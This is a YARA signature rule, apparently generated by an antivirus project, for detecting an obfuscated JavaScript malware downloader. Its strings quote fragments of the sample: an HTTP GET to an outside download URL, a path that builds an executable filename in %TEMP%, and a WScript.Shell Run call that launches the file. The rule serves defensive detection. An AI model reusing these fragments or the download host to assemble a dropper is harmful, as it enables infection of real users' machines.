rule sig_20160328_5d185944a83f9b3c35afd9fb5f0a26f7 {
  meta:
    description = "datamaliciousorder - file 20160328_5d185944a83f9b3c35afd9fb5f0a26f7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9b2c404819f4fe1eed5566e3d6f63d3acb2188efcd6d9ce09688429c1b8bfcf3"

  strings:
    $s1  = "function Zsdzsqxql() {return Xwckcevzi[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"t9zEhKdXRsVAx1.exe\";};" fullword ascii
    $s2  = "do {WScript[Evolfaqbih](Aomxefnuc() * 11)} while (Kytxzij[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Kytxzij[Rmsztivu](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s4  = "var Xwckcevzi = function Acxlg() {return WScript[Ltqtkplr](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Nadtpauga(Lvhfeajhp, Usonqo){return Lvhfeajhp - Usonqo;};" fullword ascii
    $s6  = "function Uiqirtktk() {return ((Wpulooroht == true) && (Wpulooroht == Xttuzsxx)) ? 1 : Dlobmqgibx;};" fullword ascii
    $s7  = "function Yvhqnovw(Ilbjz){Xwckcevzi[\"Run\"](Ilbjz, Dlobmqgibx, Dlobmqgibx);};" fullword ascii
    $s8  = "Xttuzsxx = true; " fullword ascii
    $s9  = "function Xvawuie(){return Ltqtkplr;};" fullword ascii
    $s10 = "function Ptxmu(Qlcibxwm) {var Izwgn = (1, 2, 3, 4, 5, Qlcibxwm); return Izwgn;};" fullword ascii
    $s11 = "function Aejcgiizna(){return Pqhqdnqxhk;};" fullword ascii
    $s12 = "var Lwcrgvt = false;" fullword ascii
    $s13 = "var Wpulooroht = false;" fullword ascii
    $s14 = " while (Iodrgdfcti){" fullword ascii
    $s15 = "function Aomxefnuc(){return 22;};" fullword ascii
    $s16 = "var Xttuzsxx = false;" fullword ascii
    $s17 = "Wpulooroht = true; " fullword ascii
    $s18 = "var Jhfag = new this[\"Date\"]();" fullword ascii
    $s19 = "function Xlvwa()" fullword ascii
    $s20 = "return Nadtpauga(Mefmti, Ycrdtxn);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}